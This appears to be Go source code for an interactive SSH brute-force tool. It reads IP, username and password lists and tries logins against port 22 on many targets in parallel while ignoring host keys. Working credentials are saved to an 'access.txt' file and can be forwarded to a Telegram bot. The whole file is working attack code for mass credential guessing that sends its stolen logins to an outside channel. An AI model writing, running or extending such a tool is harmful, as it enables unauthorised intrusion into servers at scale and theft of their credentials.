package main

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type crackHit struct {
	Target   string
	User     string
	Password string
}

func runCracker() {
	clearScreen()
	printBox("SSH CRACKER")

	fmt.Print("\nIP list (drag file or paste path): ")
	ipPath := cleanPath(askString())
	if ipPath == "" {
		fail("no ip list")
		pause()
		return
	}

	fmt.Print("Username list: ")
	userPath := cleanPath(askString())
	if userPath == "" {
		fail("no user list")
		pause()
		return
	}

	fmt.Print("Password list: ")
	passPath := cleanPath(askString())
	if passPath == "" {
		fail("no password list")
		pause()
		return
	}

	ips, err1 := readLines(ipPath)
	users, err2 := readLines(userPath)
	passwords, err3 := readLines(passPath)

	if err1 != nil || err2 != nil || err3 != nil {
		fail("error reading lists")
		pause()
		return
	}

	fmt.Printf("\nLoaded: %d IPs, %d users, %d passwords\n", len(ips), len(users), len(passwords))

	// telegram?
	fmt.Print("\nSender? [1=yes, 2=no]: ")
	useTG := askString() == "1"

	var tgToken, tgChat string
	if useTG {
		fmt.Print("Bot token: ")
		tgToken = askString()
		fmt.Print("Chat ID: ")
		tgChat = askString()
	}

	fmt.Print("\nThreads per target [default 10]: ")
	threadsPerTarget := askInt(10)
	if threadsPerTarget < 1 {
		threadsPerTarget = 10
	}

	fmt.Print("Parallel targets [default 20]: ")
	parallelTargets := askInt(20)
	if parallelTargets < 1 {
		parallelTargets = 20
	}

	fmt.Print("Timeout seconds [default 6]: ")
	timeout := askInt(6)
	if timeout < 1 {
		timeout = 6
	}

	// dirs
	crackerDir := filepath.Join("results", "cracker")
	os.MkdirAll(crackerDir, 0755)

	accessPath := filepath.Join(crackerDir, "access.txt")
	nonAccessPath := filepath.Join(crackerDir, "non_access.txt")

	accessFile, _ := os.Create(accessPath)
	nonAccessFile, _ := os.Create(nonAccessPath)
	defer accessFile.Close()
	defer nonAccessFile.Close()

	aw := bufio.NewWriter(accessFile)
	nw := bufio.NewWriter(nonAccessFile)
	defer aw.Flush()
	defer nw.Flush()

	var (
		wg          sync.WaitGroup
		sem         = make(chan struct{}, parallelTargets)
		mu          sync.Mutex
		foundCount  int
		failedCount int
		attempts    int
	)

	info(fmt.Sprintf("Starting crack: %d targets parallel, %d threads each", parallelTargets, threadsPerTarget))

	start := time.Now()

	for _, target := range ips {
		wg.Add(1)
		sem <- struct{}{}
		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()

			host, port := normalizeTarget(t, "22")
			hit, count := crackOne(host, port, users, passwords, threadsPerTarget, timeout, tgToken, tgChat)

			mu.Lock()
			attempts += count
			if hit != nil {
				foundCount++
				line := fmt.Sprintf("%s:%s | %s:%s\n", host, port, hit.User, hit.Password)
				fmt.Fprintf(aw, line)
				aw.Flush()
				fmt.Println(colorGreen + "[HIT] " + line + colorReset)
			} else {
				failedCount++
				fmt.Fprintf(nw, "%s:%s\n", host, port)
				nw.Flush()
			}
			mu.Unlock()
		}(target)
	}

	wg.Wait()
	aw.Flush()
	nw.Flush()

	elapsed := time.Since(start)
	fmt.Println()
	fmt.Println(colorGreen + "═══════════════════════════════════════════════════" + colorReset)
	fmt.Printf("  Duration     : %.1fs\n", elapsed.Seconds())
	fmt.Printf("  Attempts     : %d\n", attempts)
	fmt.Printf("  Found        : %d\n", foundCount)
	fmt.Printf("  Failed       : %d\n", failedCount)
	fmt.Println(colorGreen + "═══════════════════════════════════════════════════" + colorReset)
	fmt.Println("  results/cracker/access.txt")
	fmt.Println("  results/cracker/non_access.txt")
	pause()
}

func crackOne(host, port string, users, passwords []string, threads, timeout int, tgToken, tgChat string) (*crackHit, int) {
	addr := host + ":" + port
	var (
		hit      *crackHit
		hitMu    sync.Mutex
		attempts int
		attMu    sync.Mutex
	)

	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)

outer:
	for _, u := range users {
		for _, p := range passwords {
			hitMu.Lock()
			done := hit != nil
			hitMu.Unlock()
			if done {
				break outer
			}

			wg.Add(1)
			sem <- struct{}{}
			go func(user, pass string) {
				defer wg.Done()
				defer func() { <-sem }()

				attMu.Lock()
				attempts++
				attMu.Unlock()

				ok := trySSH(addr, user, pass, timeout)
				if ok {
					hitMu.Lock()
					if hit == nil {
						hit = &crackHit{Target: addr, User: user, Password: pass}
						if tgToken != "" && tgChat != "" {
							notifyTelegram(tgToken, tgChat, addr, user, pass)
						}
					}
					hitMu.Unlock()
				}
			}(u, p)
		}
	}

	wg.Wait()
	return hit, attempts
}

func trySSH(addr, user, pass string, timeout int) bool {
	cfg := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
	}

	client, err := ssh.Dial("tcp", addr, cfg)
	if err != nil {
		return false
	}
	client.Close()
	return true
}
